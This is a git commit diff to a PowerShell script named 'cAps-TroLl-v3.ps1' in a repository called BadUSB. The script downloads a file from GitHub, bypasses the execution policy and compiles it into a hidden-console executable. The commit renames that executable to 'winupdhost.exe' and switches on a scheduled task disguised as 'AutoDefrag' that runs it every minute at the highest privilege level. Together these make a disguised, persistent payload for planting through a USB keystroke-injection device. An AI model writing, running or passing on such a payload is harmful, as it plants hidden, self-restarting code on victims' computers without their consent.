b7dbbb433b475e97244732b75841dd88ee8b7b4a
TobiS137 <75208393+TobiS137@users.noreply.github.com>
2025-03-27 22:21:35 +0100

    Update cAps-TroLl-v3.ps1

--- cAps-TroLl-v3/cAps-TroLl-v3.ps1
+++ cAps-TroLl-v3/cAps-TroLl-v3.ps1
@@ -3,6 +3,6 @@ iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-
 Start-Sleep 1;
 Set-ExecutionPolicy -ExecutionPolicy Bypass;
 Import-Module ps2exe;
-ps2exe.ps1 raw.ps1 capslock.exe -noConsole;
-#schtasks /create /tn "AutoDefrag" /tr "$env:Temp\winupdhost.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
+ps2exe.ps1 raw.ps1 winupdhost.exe -noConsole;
+schtasks /create /tn "AutoDefrag" /tr "$env:Temp\winupdhost.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
 exit
